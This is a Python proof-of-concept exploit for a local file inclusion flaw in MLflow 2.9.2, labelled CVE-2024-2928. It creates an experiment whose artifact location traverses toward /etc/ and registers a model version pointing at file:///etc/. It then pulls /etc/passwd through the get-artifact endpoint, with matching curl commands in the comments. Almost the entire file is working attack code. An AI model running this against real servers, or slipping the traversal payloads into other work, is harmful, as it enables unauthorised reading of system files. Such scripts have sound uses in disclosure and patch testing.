import argparse
import json

import http.client
import urllib.parse

from typing import Dict, Any


def post_request(
    conn: http.client.HTTPConnection,
    endpoint: str,
    payload: str,
    headers: Dict[str, str],
) -> Dict[str, Any]:
    conn.request("POST", endpoint, body=payload, headers=headers)
    response = conn.getresponse()
    response_data = response.read().decode()
    return {"status": response.status, "data": response_data}


def get_request(conn: http.client.HTTPConnection, payload: str) -> Dict[str, Any]:
    conn.request("GET", payload)
    response = conn.getresponse()
    response_data = response.read().decode()
    return {"status": response.status, "data": response_data}


def print_response(message: str, response: Dict[str, str]) -> None:
    print(message)
    print("Status:", response["status"])
    print("Response data:", response["data"])


def main():
    server = "127.0.0.1"
    port = 5000
    headers = {"Content-Type": "application/json"}

    experiment_name = "MLflow 2.9.2 LFI Demo - CVE-2024-2928"
    experiment_id = ""
    run_id = ""

    conn = http.client.HTTPConnection(server, port)
    try:
        print(experiment_name)

        # SETUP - Create an experiment
        # curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc", "artifact_location": ""}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'
        api_endpoint = "/ajax-api/2.0/mlflow/experiments/create"
        artifact_location = (
            "http:///#/../../../../../../../../../../../../../../etc/"
        )
        payload = json.dumps(
            {"name": experiment_name, "artifact_location": artifact_location}
        )
        response = post_request(conn, api_endpoint, payload, headers)
        # Extract the experiment ID
        experiment_id = json.loads(response["data"])["experiment_id"]
        print_response("SETUP - Create an experiment", response)


        # SETUP - Associate a run
        # curl -X POST -H 'Content-Type: application/json' -d '{"experiment_id": "{{EXPERIMENT_ID}}"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'
        api_endpoint = "http://127.0.0.1:5000/api/2.0/mlflow/runs/create"
        payload = json.dumps({"experiment_id": experiment_id})
        response = post_request(conn, api_endpoint, payload, headers)
        # Extract the run id
        run_id = json.loads(response["data"])["run"]["info"]["run_uuid"]
        print_response("SETUP - Associate a run", response)


        # SETUP - Create a registered model
        # curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'
        api_endpoint = "/ajax-api/2.0/mlflow/registered-models/create"
        payload = json.dumps(
            {
                "name": experiment_name,
            }
        )
        response = post_request(conn, api_endpoint, payload, headers)
        print_response("SETUP - Create a registered model", response)


        # SETUP - Link model version to the malicious run
        # curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc", "run_id": "{{RUN_ID}}", "source": "file:///etc/"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'
        api_endpoint = "/ajax-api/2.0/mlflow/model-versions/create"
        payload = json.dumps(
            {
                "name": experiment_name,
                "run_id": run_id,
                "source": "file:///etc/",
            }
        )
        response = post_request(conn, api_endpoint, payload, headers)
        print_response(
            "SETUP - Link a model version to the malicious run", response
        )


        # PAYLOAD - Read `/etc/passwd`:
        # curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'
        lfi_headers = urllib.parse.urlencode(
            {"name": experiment_name, "path": "passwd", "version": "1"}
        )
        payload = f"/model-versions/get-artifact?{lfi_headers}"
        response = get_request(conn, payload)
        print_response("PAYLOAD - Read `/etc/passwd`", response)

    finally:
        conn.close()


if __name__ == "__main__":
    main()
